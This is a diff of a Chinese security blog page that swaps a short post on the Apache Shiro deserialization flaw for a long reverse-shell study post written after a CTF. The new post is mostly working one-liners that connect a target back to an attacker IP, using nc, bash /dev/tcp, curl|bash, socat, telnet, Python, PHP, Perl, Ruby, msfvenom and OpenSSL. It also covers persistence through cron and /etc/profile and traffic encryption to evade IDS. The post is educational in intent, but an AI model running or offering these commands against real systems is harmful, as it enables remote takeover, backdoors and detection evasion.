@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="shiro反序列化, 芜风">
+    <meta name="keywords" content="反弹shell学习, 芜风">
     <meta name="description" content="且将新火试新茶，诗酒趁年华">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>shiro反序列化 | 芜风</title>
+    <title>反弹shell学习 | 芜风</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">shiro反序列化</h1>
+                    <h1 class="description center-align post-title">反弹shell学习</h1>
                 </div>
             </div>
         </div>
@@ -442,7 +442,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-29
+                    2022-07-20
                 </div>
                 
 
@@ -451,14 +451,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    464
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    12 分
                 </div>
                 
 
@@ -478,26 +478,188 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>shiro反序列化漏洞</p>
-<span id="more"></span>
-
-<h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><h3 id="前两天在复现61个漏洞的时候，看到了一个命令执行的漏洞，而这个漏洞名就叫做shiro反序列化。也学习一下吧。"><a href="#前两天在复现61个漏洞的时候，看到了一个命令执行的漏洞，而这个漏洞名就叫做shiro反序列化。也学习一下吧。" class="headerlink" title="前两天在复现61个漏洞的时候，看到了一个命令执行的漏洞，而这个漏洞名就叫做shiro反序列化。也学习一下吧。"></a>前两天在复现61个漏洞的时候，看到了一个命令执行的漏洞，而这个漏洞名就叫做shiro反序列化。也学习一下吧。</h3><ul>
-<li>首先，对于漏洞还是知其然再知其所以然。</li>
-<li>什么是shiro反序列化漏洞，有什么用？</li>
-</ul>
-<h2 id="0x01-shiro反序列化漏洞有什么用"><a href="#0x01-shiro反序列化漏洞有什么用" class="headerlink" title="0x01 shiro反序列化漏洞有什么用"></a>0x01 shiro反序列化漏洞有什么用</h2><p>很明显吧，命令执行</p>
-<img src="/2022/01/29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ShiroUnserialize.png" class="">  
-
-<h2 id="0x02-shiro漏洞的存在"><a href="#0x02-shiro漏洞的存在" class="headerlink" title="0x02 shiro漏洞的存在"></a>0x02 shiro漏洞的存在</h2><h4 id="2-1-受影响版本"><a href="#2-1-受影响版本" class="headerlink" title="2.1 受影响版本"></a>2.1 受影响版本</h4><p>Apache Shiro &lt;&#x3D;1.2.4</p>
-<h4 id="2-2-特征判断"><a href="#2-2-特征判断" class="headerlink" title="2.2 特征判断"></a>2.2 特征判断</h4><p>返回包中含有rememberMe&#x3D;deleteMe字段</p>
-<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><p>shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用CookieRememberMeManager类对用户的登陆凭证，也就是Remember Me的内容进行一系列处理：</p>
-<p><strong>使用Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 得到加密后的Remember Me内容</strong></p>
-<p>同时在识别用户身份的时候，需要对Remember Me的字段进行解密，解密的顺序为：</p>
-<p><strong>Remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化</strong></p>
+                <p>因为最近打了 NepCTF2nd，中间有一步反弹 shell 不会，来学习学习<br><span id="more"></span></p>
+<h1 id="反弹-shell-学习"><a href="#反弹-shell-学习" class="headerlink" title="反弹 shell 学习"></a>反弹 shell 学习</h1><p>大部分内容摘自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<h2 id="0x02-机器的两种连接方式"><a href="#0x02-机器的两种连接方式" class="headerlink" title="0x02 机器的两种连接方式"></a>0x02 机器的两种连接方式</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、Web 服务、ssh、telnet 等等都是正向连接。</p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>当正向连接无法接入的时候我们需要反向连接，都有这些情况。</p>
 <ul>
-<li>▲ 问题出在<strong>AES加密的密钥Key被硬编码在代码里</strong>，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞</li>
+<li>比如在渗透过程中，发现 22 端口是存在的，当时因为防火墙的存在，目标机器只能与加白的机器连接。</li>
+<li>目标机端口被占用。</li>
+<li>目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。</li>
+<li>…. 还有一些其他的未知情况</li>
 </ul>
-<h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>其实当时也是运气好吧，帮公司排查漏洞的时候发现的shiro反序列化，工具是ShiroExpolit<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">feihong-cs&#x2F;ShiroExploit-Deprecated: Shiro550&#x2F;Shiro721 一键化利用工具，支持多种回显方式 (github.com)</a><br>其余教程网上也有，就不再赘述了。</p>
+<p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
+<p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p>
+<h2 id="0x03-反弹-shell-姿势总结"><a href="#0x03-反弹-shell-姿势总结" class="headerlink" title="0x03 反弹 shell 姿势总结"></a>0x03 反弹 shell 姿势总结</h2><ul>
+<li>我这里的是两台 Linux 机器</li>
+</ul>
+<h3 id="1-使用-netcat-反弹-shell"><a href="#1-使用-netcat-反弹-shell" class="headerlink" title="1. 使用 netcat 反弹 shell"></a>1. 使用 netcat 反弹 shell</h3><ul>
+<li>一般 Linux 发行版当中都会自带 netcat，若功能不全可下载二进制的版本，进行编译即可。</li>
+</ul>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">netcat -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">netcat 89.xxx.xxx.72 2333 -e /bin/bash
+# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
+</code></pre>
+<p>弹 shell 效果如下</p>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/ncSucc.png" class="">
+<h3 id="2-利用-Bash-反弹-shell"><a href="#2-利用-Bash-反弹-shell" class="headerlink" title="2. 利用 Bash 反弹 shell"></a>2. 利用 Bash 反弹 shell</h3><p>反弹 shell 最好用的方法就是使用 bash 结合重定向方法的一句话，具体命令如下：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
+或
+bash -c "bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1"
+# bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
+</code></pre>
+<ul>
+<li>bash -i : 产生一个 bash 交互环境。</li>
+<li><code>&gt;&amp;</code> : 将联合符号前面的内容与后面相结合，然后一起重定向给后者。</li>
+<li><code>/dev/tcp/47.xxx.xxx.72/2333</code> : 让目标主机与攻击机 47.xxx.xxx.72 的 2333 端口建立一个 tcp 连接</li>
+<li><code>0&gt;&amp;1</code> : 将标准输入与标准输出的内容相结合然后重定向给前面标准输出的内容。</li>
+</ul>
+<p>Bash 反弹一句完整的解读过程就是：</p>
+<p>Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333 会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p>
+<blockquote>
+<p>实操</p>
+</blockquote>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
+</code></pre>
+<p>成功！</p>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/BashSucc.png" class="">
+<h4 id="Curl-配合-Bash-反弹-Shell"><a href="#Curl-配合-Bash-反弹-Shell" class="headerlink" title="Curl 配合 Bash 反弹 Shell"></a>Curl 配合 Bash 反弹 Shell</h4><p>这里操作也很简单，借助了 Linux 中的管道。</p>
+<p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
+</code></pre>
+<p>并开启 2333 端口的监听。</p>
+<p>然后再目标机上执行如下，即可反弹 shell：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">curl 47.xxx.xxx.72|bash
+</code></pre>
+<p>这里我没试成功，用另外师傅成功的图片</p>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/curl.png" class="">
+<p>Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现，<code>curl IP|bash</code> 中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
+<h4 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h4><p>我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
+<p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)</p>
+<p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian/Ubuntu系列主机)</p>
+<h4 id="将反弹-shell-的命令写入-etc-profile-文件"><a href="#将反弹-shell-的命令写入-etc-profile-文件" class="headerlink" title="将反弹 shell 的命令写入 /etc/profile 文件"></a>将反弹 shell 的命令写入 /etc/profile 文件</h4><p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">/bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
+# 最后面那个&为的是防止管理员无法输入命令
+</code></pre>
+<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：</p>
+<ul>
+<li>个人觉得这里很像后门</li>
+</ul>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/etcProfile.png" class="">
+<h3 id="3-使用-socat-反弹-shell"><a href="#3-使用-socat-反弹-shell" class="headerlink" title="3. 使用 socat 反弹 shell"></a>3. 使用 socat 反弹 shell</h3><p>Socat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a target="_blank" rel="noopener" href="http://brieflyx.me/2015/linux-tools/socat-introduction/">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p>
+<p>弹 shell 的手法和 netcat 一样</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">socat TCP-LISTEN:2333 -
+或
+nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
+</code></pre>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/socat.png" class="">
+<h3 id="4-利用-Telnet-弹-shell"><a href="#4-利用-Telnet-弹-shell" class="headerlink" title="4. 利用 Telnet 弹 shell"></a>4. 利用 Telnet 弹 shell</h3><p>当 nc 和 /dev/tcp 不可用，且目标主机和攻击机上支持 Telnet 服务时，我们可以使用Telnet反弹shell。</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a
+</code></pre>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/telnet.png" class="">
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p><strong>攻击机需要开启两个本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+nc -lvvp 4000
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000
+</code></pre>
+<h3 id="5-各种脚本反弹-shell"><a href="#5-各种脚本反弹-shell" class="headerlink" title="5. 各种脚本反弹 shell"></a>5. 各种脚本反弹 shell</h3><h4 id="Python-脚本弹-shell"><a href="#Python-脚本弹-shell" class="headerlink" title="Python 脚本弹 shell"></a>Python 脚本弹 shell</h4><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-python"><code class="language-lang-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/python.png" class="">
+<h4 id="php-脚本弹-shell"><a href="#php-脚本弹-shell" class="headerlink" title="php 脚本弹 shell"></a>php 脚本弹 shell</h4><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
+</code></pre>
+<h4 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a>Perl 脚本反弹shell</h4><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");&#125;;'
+</code></pre>
+<h4 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h4><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">nc -lvvp 2333
+</code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'
+或
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'
+</code></pre>
+<h3 id="6-使用Metasploit生成反弹shell用的一句话"><a href="#6-使用Metasploit生成反弹shell用的一句话" class="headerlink" title="6. 使用Metasploit生成反弹shell用的一句话"></a>6. 使用Metasploit生成反弹shell用的一句话</h3><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p>
+<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">msfvenom -l payloads | grep 'cmd/unix/reverse'
+</code></pre>
+<p>如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw
+</code></pre>
+<p>将生成的python反弹shell的一句话在目标主机上执行即可：</p>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/metasploit.png" class="">
+<h2 id="0x04-反弹shell后获取模拟终端"><a href="#0x04-反弹shell后获取模拟终端" class="headerlink" title="0x04 反弹shell后获取模拟终端"></a>0x04 反弹shell后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
+<ul>
+<li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li>
+<li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li>
+<li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li>
+</ul>
+<p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p>
+<p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">python -c "import pty;pty.spawn('/bin/bash')"
+</code></pre>
+<h2 id="0x05-使用OpenSSL反弹加密shell"><a href="#0x05-使用OpenSSL反弹加密shell" class="headerlink" title="0x05 使用OpenSSL反弹加密shell"></a>0x05 使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p>
+<h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p>
+<blockquote>
+<p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p>
+</blockquote>
+<p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+</code></pre>
+<h3 id="反弹-shell-实操"><a href="#反弹-shell-实操" class="headerlink" title="反弹 shell 实操"></a>反弹 shell 实操</h3><p>实验环境：Linux</p>
+<p>目标机：</p>
+<ul>
+<li>系统：Linux</li>
+<li>IP：192.168.1.8</li>
+</ul>
+<p>攻击机：</p>
+<ul>
+<li>系统：Linux</li>
+<li>IP：47.xxx.xxx.72</li>
+</ul>
+<p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
+</code></pre>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/openssl.png" class="">
+<p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL/TLS server。</p>
+<p>这时在目标机进行反弹 shell 操作，命令为：</p>
+<pre class=" language-lang-bash"><code class="language-lang-bash">mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s
+</code></pre>
+<img src="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/opensslSucc.png" class="">
+<p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>
 
                 
             </div>
@@ -524,7 +686,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://drun1baby.github.io/2022/01/29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://drun1baby.github.io/2022/01/29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="https://drun1baby.github.io/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">https://drun1baby.github.io/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -997,29 +1159,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/29/TryHackMe-Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                <a href="/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="TryHackMe-Web基础知识">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="反弹shell学习">
                         
-                        <span class="card-title">TryHackMe-Web基础知识</span>
+                        <span class="card-title">反弹shell学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            TryHackMe Web基础知识
+                            因为最近打了 NepCTF2nd，中间有一步反弹 shell 不会，来学习学习
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1028,6 +1191,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1038,31 +1202,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/29/PortSwigger-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                <a href="/2022/07/19/NepCTF2nd-Web%E9%83%A8%E5%88%86WP/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="PortSwigger-文件上传">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="NepCTF2nd-Web部分WP">
                         
-                        <span class="card-title">PortSwigger-文件上传</span>
+                        <span class="card-title">NepCTF2nd-Web部分WP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PortSwigger-文件上传 FileUpload
+                            NepCTF2nd-Web 部分 WP
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-19
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Port/" class="post-category">
-                                    Port
+                            <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" class="post-category">
+                                    CTF比赛
                                 </a>
                             
                             
@@ -1072,8 +1236,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/CTF%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">CTF比赛</span>
                     </a>
                     
                 </div>
